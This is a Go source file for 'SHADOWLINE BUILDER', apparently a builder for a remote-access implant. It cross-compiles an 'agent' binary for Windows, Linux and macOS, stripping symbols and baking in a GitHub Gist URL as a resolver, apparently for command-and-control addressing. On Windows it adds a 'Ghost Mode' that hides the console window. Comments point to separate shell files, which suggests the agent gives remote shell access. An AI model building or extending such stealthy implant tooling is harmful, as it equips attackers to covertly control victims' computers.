package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"strings"
)

const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorBlue   = "\033[34m"
	ColorPurple = "\033[35m"
	ColorCyan   = "\033[36m"
)

// Config Structure
type Config struct {
	GithubToken  string `json:"github_token"`
	GistID       string `json:"gist_id"`
	GistFilename string `json:"gist_filename"`
}

func main() {
	clearScreen()
	printBanner()

	// Load Config and Gist URL
	cfg := loadConfig()
	var defaultGist string
	if cfg.GistID != "" {
		defaultGist = fmt.Sprintf("https://gist.githubusercontent.com/raw/%s/%s", cfg.GistID, cfg.GistFilename)
	}

	fmt.Println("Enter Gist RAW Link (Config estimate: " + defaultGist + ")")
	fmt.Print("Link > ")

	reader := bufio.NewReader(os.Stdin)
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)

	finalURL := defaultGist
	if input != "" {
		finalURL = input
	}

	if finalURL == "" {
		fmt.Println("Error: No link provided!")
		return
	}

	// --- MENU ---
	for {
		fmt.Println("\n[ SELECT TARGET OS ]")
		fmt.Println("1) Windows (agent.exe) - Ghost Mode")
		fmt.Println("2) Linux   (agent_linux) - ELF Binary")
		fmt.Println("3) MacOS   (agent_mac) - Mach-O Binary")
		fmt.Println("9) Exit")
		fmt.Print("\nSelect > ")

		choice, _ := reader.ReadString('\n')
		choice = strings.TrimSpace(choice)

		switch choice {
		case "1":
			buildAgent("windows", "amd64", "agent.exe", true, finalURL)
		case "2":
			buildAgent("linux", "amd64", "agent_linux", false, finalURL)
		case "3":
			buildAgent("darwin", "amd64", "agent_mac", false, finalURL)
		case "9":
			os.Exit(0)
		default:
			fmt.Println("Invalid option.")
		}
	}
}

func loadConfig() Config {
	file, _ := os.Open("../config.json")
	defer file.Close()
	var cfg Config
	json.NewDecoder(file).Decode(&cfg)
	return cfg
}

func buildAgent(osType, arch, outputName string, hidden bool, resolverURL string) {
	fmt.Printf("[*] Compiling for %s/%s...\n", osType, arch)

	// Agent path
	agentPath := "../agent" // We point to the FOLDER now, not file
	if _, err := os.Stat(agentPath); os.IsNotExist(err) {
		agentPath = "agent"
	}

	cmd := exec.Command("go", "build")

	ldflags := fmt.Sprintf("-s -w -X main.RESOLVER_URL=%s", resolverURL)
	if hidden && osType == "windows" {
		ldflags += " -H=windowsgui"
	}

	// Point to the package (folder) containing all .go files
	// Go will automatically pick the right shell_windows.go or shell_unix.go
	cmd.Args = append(cmd.Args, "-ldflags", ldflags, "-o", outputName, "./"+agentPath)

	cmd.Env = os.Environ()
	cmd.Env = append(cmd.Env, "GOOS="+osType, "GOARCH="+arch, "CGO_ENABLED=0")

	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("[-] Error: %v\n%s\n", err, string(out))
	} else {
		fmt.Printf("[+] Success: %s created!\n", outputName)
	}
}

func printBanner() {
	banner := `

  █████████  █████                    █████                          █████        ███                     
 ███░░░░░███░░███                    ░░███                          ░░███        ░░░                      
░███    ░░░  ░███████    ██████    ███████   ██████  █████ ███ █████ ░███        ████  ████████    ██████ 
░░█████████  ░███░░███  ░░░░░███  ███░░███  ███░░███░░███ ░███░░███  ░███       ░░███ ░░███░░███  ███░░███
 ░░░░░░░░███ ░███ ░███   ███████ ░███ ░███ ░███ ░███ ░███ ░███ ░███  ░███        ░███  ░███ ░███ ░███████ 
 ███    ░███ ░███ ░███  ███░░███ ░███ ░███ ░███ ░███ ░░███████████   ░███      █ ░███  ░███ ░███ ░███░░░  
░░█████████  ████ █████░░████████░░████████░░██████   ░░████░████    ███████████ █████ ████ █████░░██████ 
 ░░░░░░░░░  ░░░░ ░░░░░  ░░░░░░░░  ░░░░░░░░  ░░░░░░     ░░░░ ░░░░    ░░░░░░░░░░░ ░░░░░ ░░░░ ░░░░░  ░░░░░░  
                                                                                                          
                                                                                                          
                                                                                                          
   SHADOWLINE BUILDER
`
	fmt.Println(ColorRed + banner + ColorReset)
}

func clearScreen() {
	// Simple clear (Windows/Linux compatible enough for now)
	fmt.Print("\033[H\033[2J")
}
